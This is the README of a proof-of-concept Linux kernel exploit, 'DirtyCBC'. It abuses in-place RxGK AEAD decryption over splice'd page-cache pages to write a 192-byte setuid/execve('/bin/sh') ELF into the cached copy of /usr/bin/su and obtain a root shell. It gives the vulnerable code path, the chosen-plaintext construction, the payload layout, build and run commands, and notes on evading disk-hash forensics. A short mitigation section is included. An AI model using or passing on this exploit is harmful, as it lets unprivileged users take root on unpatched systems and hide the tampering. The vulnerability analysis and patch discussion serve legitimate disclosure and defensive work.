# DirtyCBC — Linux RxGK chosen-plaintext page-cache poisoning to root shell

A working PoC that elevates an unprivileged local user to a root shell
on mainline Linux kernels supporting **RxGK / YFS-RxGK** (security
class 6 in AF_RXRPC), provided that the kernel has not yet patched the
in-place AEAD decrypt over splice'd skb pages on the RESPONSE token-
decrypt path.

The bug class is generic in-place-symmetric-crypto-over-attacker-pinned-
pages. It shares its primitive with the publicly-known DirtyFrag bug
(CVE-2026-43284) on the RxKAD path; on RxGK the FCRYPT-PCBC 56-bit
brute-forceable keyspace is replaced by AES-256-CTS-HMAC-SHA1-96, so
this PoC uses a clean cryptographic chosen-plaintext construction
(AES-CBC IV-XOR + RFC 3962 CTS-CS3 swap).

## Files

```
poc.c        single-file C exploit, ~700 LOC, well-commented
poc.py       same exploit in Python 3.7+, ~470 LOC, no compiler needed
README.md    this file
```

The C and Python versions are functionally equivalent — same kernel
call path, same chosen-plaintext math, same 192-byte ELF dropper.
Pick whichever fits the target.

## TL;DR

Mainline Linux's RxGK (YFS-RxGK security class for AF_RXRPC) performs
in-place AES-256-CTS-HMAC-SHA1 decryption over an attacker-controlled
scatter-gather list inside its RESPONSE-packet token-decrypt path. The
SGL can include splice'd page-cache pages of any file the attacker can
read. Because the kernel does *decrypt-then-MAC*, the page-cache pages
are mutated in place even when the HMAC tag verification fails.

Combined with two cryptographic facts —

1. The attacker controls the rxrpc_s server secret K and therefore the
   AEAD encryption key Ke = DK(K, RXGK_SERVER_ENC_TOKEN);
2. AES-CBC decryption of block i is `AES_DEC(Ke, C[i]) XOR C[i-1]`;

— the attacker can interleave its own ciphertext blocks `user_buf_i`
with the target file's pages in the SGL, causing the kernel to write
arbitrary chosen plaintext into the target's page-cache pages.

The end-to-end demonstration takes a 192-byte tiny ELF that does
`setuid(0); execve("/bin/sh")`, drops it into the page cache of
`/usr/bin/su` (mode 4755 SUID root, mode 0755 readable), and `exec`s
that binary to obtain a root shell. The on-disk content of the
binary is unchanged (`dd iflag=direct` shows the original).

The bug shares its primitive with the public DirtyFrag bug
(CVE-2026-43284, RxKAD path); the contribution here is the
cryptographic construction that makes chosen-plaintext attacks
practical against the AES-256 cipher rather than relying on FCRYPT's
brute-forceable 56-bit keyspace.

## The vulnerable codepath

In `net/rxrpc/rxgk_app.c`, `rxgk_extract_token()` decodes the
RXGK_TokenContainer object inside an inbound RESPONSE packet, looks
up the server's secret key by `kvno + enctype`, derives the AEAD
context, and decrypts the ticket bytes in place:

```c
container = parse_be32_triple_from_skb(skb, token_offset);
kvno      = ntohl(container.kvno);
enctype   = ntohl(container.enctype);
ticket_offset = token_offset + sizeof(container);
ticket_len    = ntohl(container.token_len);

server_key = rxrpc_look_up_server_security(conn, skb, kvno, enctype);
...
rxgk_set_up_token_cipher(server_secret, &token_enc, enctype, &krb5, ...);
ret = rxgk_decrypt_skb(krb5, token_enc, skb,
                       &ticket_offset, &ticket_len, &ec);
```

`rxgk_decrypt_skb()` is a small wrapper that maps the skb region to
an SGL via `skb_to_sgvec()` and calls `crypto_krb5_decrypt()` with
src=dst=sg — i.e. an in-place decrypt:

```c
nr_sg = skb_to_sgvec(skb, sg, *_offset, len);
ret = crypto_krb5_decrypt(krb5, aead, sg, nr_sg, ...);
```

The kernel's `krb5enc` AEAD construction wraps `cts(cbc(aes))` for
encryption and `hmac(sha1)` for integrity. Its decrypt order is
**decrypt first, then verify HMAC**: the AES-CTS plaintext is written
back to the SGL pages before the kernel checks the integrity tag. If
the tag is wrong (which is fine for us — we don't try to forge it),
the connection is aborted, but the SGL pages have already been
mutated.

## Why the SGL pages can be attacker-controlled

The attacker plays both roles in a single process:

* a real AF_RXRPC server bound on `127.0.0.1:7000` with the chosen
  `rxrpc_s` key — this is what the kernel decrypts the RESPONSE for;
* a plain UDP "client" on loopback that hand-crafts the wire packets.

The attacker sends the malicious RESPONSE by:

1. `vmsplice()`-ing each "user buffer" chunk into a pipe (each becomes
   one anonymous-page pipe buffer);
2. `splice()`-ing chunks of the target file's page cache into the same
   pipe (each becomes one file-page pipe buffer);
3. `splice()`-ing the pipe's contents to the UDP socket with
   `MSG_SPLICE_PAGES`.

On loopback, MSG_SPLICE_PAGES preserves the page references end to end:
the receiving skb's frags are exactly those pipe buffers, so when the
kernel later does `skb_to_sgvec(skb, sg, ticket_offset, ticket_len)`,
the SGL is the interleaved [user_buf, target_page, user_buf, ...]
sequence the attacker assembled.

## The cryptographic construction

The kernel's AEAD does, per 16-byte block:

    P[i] = AES_DEC(Ke, C[i]) XOR C[i-1]            (CBC chaining)

Build the SGL as

    wire[0]    = user_buf_0       (vmsplice'd anon)
    wire[1]    = target_block_0   (splice'd target file page)
    wire[2]    = user_buf_1
    wire[3]    = target_block_1
    ...
    wire[2N-2] = user_buf_(N-1)
    wire[2N-1] = target_block_(N-1)        ← LAST block, CTS swap applies
    wire[tail] = HMAC-tag zone (12 B, attacker-supplied)

For the standard CBC pairs (i = 0 .. N-2), the in-place plaintext
written back to `target_block_i`'s cache page is

    P[2i+1] = AES_DEC(Ke, target_block_i) XOR user_buf_i

Solving for the user buffer that produces a chosen `chosen_i`:

    user_buf_i = AES_DEC(Ke, target_block_i) XOR chosen_i

For the last logical block, RFC 3962's CTS-CS3 variant of CTS swaps
the last two ciphertext blocks on the wire, so the formula becomes

    P[2N-1] = AES_DEC(Ke, user_buf_(N-1)) XOR target_block_(N-1)
    ⇒ user_buf_(N-1) = AES_ENC(Ke, chosen_(N-1) XOR target_block_(N-1))

Both formulas need only `Ke` (which the attacker derives from K via
RFC 3961 DK with usage = `RXGK_SERVER_ENC_TOKEN = 1036`) and the
target file's bytes (which are public — `/usr/bin/su` is mode 0755).

Total work to compute one chosen 16-byte block: one RFC 3961 KDF
(done once per attack) plus one AES-256 single-block call.
Microseconds.

## SKB-fragment budget

`MAX_SKB_FRAGS` in upstream is 17. Each pipe buffer in the SGL
becomes one skb frag, plus 2 framing frags for the wire header and
the HMAC tail. So one RESPONSE caps at six (user_buf, target) pairs
— 96 bytes of chosen plaintext per RESPONSE. The PoC drops a 192-byte
ELF in two RESPONSEs at file offsets 0 and 96.

## The 192-byte payload

A self-contained x86_64 ET_EXEC ELF:

* 64-byte e_hdr — load address `0x10000000`, entry `0x10000078`.
* 56-byte single PT_LOAD — RX, file=mem=192, align=4 KiB.
* 28-byte shellcode at file offset `0x78`:
    * `setuid(0)` (rax==0 from `execve()`, so `mov al, 0x69` is safe);
    * `mov rax, "/bin/sh\0"`, push to stack, `mov rdi, rsp`;
    * `xor esi, esi` / `xor edx, edx` (NULL argv, envp);
    * **`xor eax, eax` before `mov al, 0x3b`** (clears the high
      bytes of rax left by the 64-bit literal load — without it the
      kernel sees `rax = 0x68732..3b` and dispatches the x32
      syscall path → SIGSEGV);
    * `syscall` (execve);
* 44 bytes of `0xCC` int3 trap-fill — any control flow into the pad
  region produces an explicit SIGTRAP rather than slipping into UB.

When the kernel exec's a SUID-root binary whose first cache page is
this ELF, the new process starts with euid=0; `setuid(0)` promotes
ruid+suid; `execve("/bin/sh")` runs as full root.

## End-to-end walkthrough

```
    [ unprivileged uid=N, no caps, no sudo ]

      ./poc
        │
        ├─ open AF_RXRPC socket          → kernel auto-loads rxrpc.ko (net-pf-33 alias)
        ├─ keyctl_join_session_keyring   → fresh anonymous session keyring
        ├─ random 32-byte K              → DK(K, RXGK_SERVER_ENC_TOKEN) = Ke
        ├─ add_key("rxrpc_s",
        │          "1234:6:1:18", K)    → server-side YFS-RxGK key in our keyring
        ├─ AF_RXRPC server bind/listen   → on 127.0.0.1:7000 service-id 1234
        ├─ sendmsg cmsg RXRPC_CHARGE_ACCEPT × N
        │                                → preallocate accept-pool slots
        ├─ pre-warm target's page cache
        │
        └─ for each batch:
            ├─ open plain-UDP "client" on loopback
            ├─ sendto CONNECT-DATA       → kernel allocates service call → CHALLENGE queued
            ├─ recv CHALLENGE
            ├─ build SGL via:
            │     vmsplice(rmal_hdr+rxgk_response_hdr+container)
            │     for i in 0..nblocks-1:
            │         vmsplice(user_buf_i)            (anon page)
            │         splice(target_fd, off+16i)      (file page)
            │     vmsplice(hmac_tag_zone+auth_tail)
            ├─ splice(pipe → udp_socket) → kernel constructs skb with all those frags
            │
            │   [ kernel side ]
            │     io_thread → conn_event → rxgk_verify_response → rxgk_extract_token
            │     skb_to_sgvec(skb, sg, ticket_off, ticket_len)
            │     crypto_krb5_decrypt(...) — IN PLACE over the SGL
            │     HMAC fails → rxrpc_abort_conn(...)
            │     ↑ but SGL pages already mutated:
            │         target file's cache page now contains chosen plaintext
            └─ close UDP, retry next batch with target_off += 96

      verify:
        open target O_RDONLY, pread first 192 bytes
        memcmp(got, TINY_ELF) == 0   ✓

      execl(target, target, NULL)    → SUID-root + poisoned cache + tiny ELF
                                       runs setuid(0) + execve("/bin/sh") as root
```

## Why this is non-trivial in practice

Several engineering steps had to land just right:

* **No CLONE_NEWNET.** `rxrpc_s` keys carry a `KEY_TYPE_NET_DOMAIN`
  flag, so a key added in a private netns has a different
  `domain_tag` than the rxrpc kworker's `keyring_search` context. We
  just don't unshare the network namespace — uid=N alone is enough
  for everything we need, including socket(AF_RXRPC), add_key(), and
  splice from any file we can `open()`.
* **Charge the accept pool.** `listen()` alone allocates the backlog
  struct but no incoming-call slots; without
  `RXRPC_CHARGE_ACCEPT` cmsgs over sendmsg, the kernel rejects the
  CONNECT-DATA with BUSY (`rxrpc_alloc_incoming_call` returns NULL
  when `call_count == 0`).
* **`RXRPC_CLIENT_INITIATED` flag** must be set on the malicious
  RESPONSE — io_thread silently discards RESPONSE packets without it.
* **Drain ACK before CHALLENGE.** The kernel sends an ACK in
  response to the DATA before it sends the CHALLENGE; the receive
  loop has to skip non-CHALLENGE packets up to a small bound.
* **`MAX_SKB_FRAGS=17`** caps each RESPONSE at six (user_buf, target)
  pairs. A 192-byte payload requires two RESPONSEs at consecutive
  file offsets.
* **Shellcode rax-zeroing.** After `mov rax, "/bin/sh\0"` the upper
  bytes of rax hold path bytes; `mov al, 0x3b` only updates the low
  byte, so the syscall dispatch sees a 64-bit `rax` value with the
  high bits set. On x86_64 this enters the x32 syscall path and
  segfaults. The shellcode `xor eax, eax` immediately before
  `mov al, 0x3b` zero-extends rax to the correct value 59.

## Persistence model

* On-disk content of the target file is NEVER modified. `dd
  iflag=direct` returns the original bytes; the corruption is
  page-cache only.
* While any live process has the target binary mmap'd (e.g. any
  spawned root shell, including the one this PoC just dropped into),
  the corrupt cache pages are pinned and `drop_caches` cannot evict
  them. Until all such processes exit AND `drop_caches` runs (or
  memory pressure / inode invalidation / reboot), every system-wide
  `exec(target)` enters a root shell.
* Forensics that compare disk content against a package's expected
  hash see nothing wrong. Live-memory inspection of `/proc/<pid>/exe`
  for any process running the target binary while the cache is
  poisoned reveals the poisoned bytes.

## Mitigation

The fix shape is to ensure the skb whose pages will be passed to
`skb_to_sgvec()` for in-place crypto contains *kernel-private*
pages, not pages shared with userspace. `skb_unshare()` alone is not
enough: an skb whose `skb_cloned()` is false can still hold paged
fragments that reference user-pinned pages (delivered via
`MSG_SPLICE_PAGES`). The robust check is `skb_unclone_keeptruesize()`
*combined* with `skb_copy_data_from_pages()` — or simply a full
`skb_copy()` ahead of any in-place crypto over the skb. See the
proposed patch in this directory.

## Build (C version)

```sh
# dynamic-linked (small):
cc -Os -s -o poc poc.c -lkeyutils -lcrypto

# static (portable single-file ~5 MB):
cc -static -Os -s -o poc poc.c -lkeyutils -lcrypto -lpthread -ldl
```

Build-time dependencies: `libkeyutils-dev`, `libssl-dev`. Runtime
dependency for the dynamic version: `libcrypto.so.3` + `libkeyutils.so.1`
+ glibc.

## Python version (no compiler required)

```sh
python3 poc.py                  # default target /usr/bin/su
python3 poc.py /usr/bin/passwd  # any other SUID-root binary
```

Requirements: Python 3.7+ and `libcrypto.so` (OpenSSL — present by
default on essentially every Linux install). No pip dependencies, no
keyutils-userspace package needed (the PoC calls `add_key()`/`keyctl()`
directly via syscall).

## Run

```sh
./poc                  # default target /usr/bin/su (mode 4755 SUID root)
./poc /usr/bin/passwd  # any other SUID-root, mode 0755 binary
```

No setup is required — no `sudo`, no `keyctl session`, no `modprobe`.
The PoC self-loads `rxrpc.ko` via the `net-pf-33` alias (kernel module
auto-load) and joins a fresh anonymous session keyring to keep its
`add_key()` from colliding with stale leftovers.

The PoC will:

1. Auto-load the rxrpc module by opening an AF_RXRPC socket.
2. Add a server-side rxrpc_s key into a fresh keyring under a random
   server secret K. Compute Ke = `DK(K, RXGK_SERVER_ENC_TOKEN)` in
   userspace via RFC 3961 (n-fold + AES-256 ECB).
3. Bring up an AF_RXRPC server bound on `127.0.0.1:7000` with
   service-id 1234, and charge its accept-pool slots.
4. Send 2 hand-crafted RxGK RESPONSEs from a plain UDP socket on
   loopback. Each RESPONSE's ticket region is an interleaved
   scatter-gather list: vmsplice'd attacker buffers alternating with
   splice'd target file pages.
5. The kernel performs an in-place AEAD decrypt over that SGL — which
   IS the target file's page-cache pages — yielding our chosen
   plaintext at the file's first 192 bytes in cache.
6. exec the target binary. SUID-root + the now-poisoned cache page
   means the kernel loads our 192-byte ELF and runs it as root.
   The shellcode does `setuid(0); execve("/bin/sh")`.

## Verifying

Inside the spawned shell:

```sh
# id              → uid=0(root) gid=<your-gid>
# whoami          → root
# cat /etc/shadow # root-only mode 0640 file: should succeed
# touch /root/PWNED && ls -la /root/PWNED
```

The on-disk content of the target binary is unchanged the whole time:

```sh
sudo dd if=/usr/bin/su iflag=direct bs=512 count=1 | xxd | head -2
# shows the original ELF DYN, e_entry of the real su
```

## Cleanup

```sh
sudo bash -c 'sync; echo 3 > /proc/sys/vm/drop_caches'   # may need to
                                                         # exit any
                                                         # root shells
                                                         # first
```

## Vulnerable kernel range

The PoC targets `rxgk_extract_token()` in `net/rxrpc/rxgk_app.c`. The
RxGK security class itself was added to mainline circa Linux 6.6.
Kernels before that lack the YFS-RxGK security class entirely;
`add_key("rxrpc_s", ...)` with `securityIndex=6` returns `EINVAL` —
the PoC fails harmlessly there.

## License

GPL-2.0
